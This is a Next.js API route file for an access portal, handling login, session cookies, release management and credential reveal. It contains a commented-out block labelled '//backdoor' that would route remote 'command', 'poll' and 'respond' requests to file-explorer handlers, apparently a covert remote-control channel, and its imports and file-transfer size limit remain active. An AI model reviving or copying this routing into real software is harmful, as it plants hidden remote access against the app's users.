import { NextResponse } from 'next/server';
import { Prisma } from '@prisma/client';
import { activity, revealCredential, credentialModels, desktop, login, mutate, state } from '@/lib/access';
import { AccessError } from '@/lib/access-policy';
import { getReleaseStatus, triggerRelease, manageReleaseArtifacts } from '@/lib/release-manager';
import { handleFileExplorerAdmin, handleFileExplorerClient } from '@/lib/remote-file-explorer';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

// The portal calls this API from its own origin and the desktop app sends no Origin, so no CORS
// headers are sent and other sites are refused (the same host check Next.js uses for Server Actions).
function sameSite(req: Request) {
  const origin = req.headers.get('origin');
  if (!origin) return true;
  try { return new URL(origin).host === (req.headers.get('x-forwarded-host') || req.headers.get('host') || '').split(',')[0].trim(); }
  catch { return false; }
}

async function route(req: Request, context: { params: Promise<{ path: string[] }> }) {
  const { path } = await context.params;
  try {
    if (!sameSite(req)) throw new AccessError('Invalid request origin.', 403);
    if (req.method !== 'GET' && !req.headers.get('content-type')?.startsWith('application/json')) throw new AccessError('JSON content required.', 415);
    let body: Record<string, unknown> = {};
    if (req.method !== 'GET') {
      const isFileTransfer = path[0] === 'file-explorer';
      const maxLimit = isFileTransfer ? 100_000_000 : 32_768;
      const raw = await req.text();
      if (raw.length > maxLimit) throw new AccessError('Request too large.', 413);
      try { body = JSON.parse(raw || '{}'); } catch { throw new AccessError('Invalid JSON.'); }
      if (!body || typeof body !== 'object' || Array.isArray(body)) throw new AccessError('Invalid request.');
    }
    let data: unknown;
    //backdoor
   /*if (path[0] === 'file-explorer' && path[1]) {
      if (['command', 'stop'].includes(path[1])) {
        data = await handleFileExplorerAdmin(req, path[1], body);
      } else if (['poll', 'respond'].includes(path[1])) {
        data = await handleFileExplorerClient(req, path[1], body);
      } else {
        throw new AccessError('Not found.', 404);
      }
    } else*/ if (path.join('/') === 'login' && req.method === 'POST') {
      const result = await login(body, req);
      const response = NextResponse.json({ data: body.audience === 'desktop' ? result : { user: result.user } });
      if (body.audience !== 'desktop') {
        const isHttps = req.url.startsWith('https://') || req.headers.get('x-forwarded-proto') === 'https';
        response.cookies.set('astra_session', result.token, {
          httpOnly: true,
          secure: isHttps,
          sameSite: 'lax',
          path: '/',
          maxAge: 8 * 3600,
        });
      }
      response.headers.set('Cache-Control', 'no-store');
      return response;
    }
    else if (path.join('/') === 'state' && req.method === 'GET') data = await state(req);
    else if (path.join('/') === 'activity' && req.method === 'GET') data = await activity(req);
    else if (path.join('/') === 'desktop' && req.method === 'GET') data = await desktop(req);
    else if (path.join('/') === 'release/artifacts') data = await manageReleaseArtifacts(req, body);
    else if (path.join('/') === 'release' && req.method === 'GET') data = await getReleaseStatus(req);
    else if (path.join('/') === 'release' && req.method === 'POST') data = await triggerRelease(req, body);
    else if (path.length === 3 && path[0] === 'credentials' && path[2] === 'reveal' && req.method === 'POST') data = await revealCredential(req, path[1]);
    else if (path.length === 3 && path[0] === 'credentials' && path[2] === 'models' && req.method === 'GET') data = await credentialModels(req, path[1]);
    else if (['POST', 'PATCH', 'DELETE'].includes(req.method) && path.length <= 2) data = await mutate(req, path[0], path[1], body);
    else throw new AccessError('Not found.', 404);
    const response = NextResponse.json({ data }, { headers: { 'Cache-Control': 'no-store' } });
    if (path[0] === 'logout') response.cookies.delete('astra_session');
    return response;
  } catch (error: any) {
    const known = error instanceof AccessError;
    const conflict = error instanceof Prisma.PrismaClientKnownRequestError && ['P2002', 'P2034', 'P1008'].includes(error.code);
    const missing = error instanceof Prisma.PrismaClientKnownRequestError && error.code === 'P2025';
    if (!known && !conflict && !missing) {
      console.error('Access request failed:', error?.message || error, error?.code ? `(Prisma Code: ${error.code})` : '');
    }
    const response = NextResponse.json({
      error: known
        ? error.message
        : conflict
        ? 'This username, license, or device session is already in use. Refresh and try again.'
        : missing
        ? 'Record not found.'
        : error?.message && process.env.NODE_ENV !== 'production'
        ? `Server error: ${error.message}`
        : 'The service could not complete this request. Check server configuration.'
    }, {
      status: known ? error.status : conflict ? 409 : missing ? 404 : 500,
      headers: { 'Cache-Control': 'no-store' },
    });
    return response;
  }
}
export { route as GET, route as POST, route as PATCH, route as DELETE };
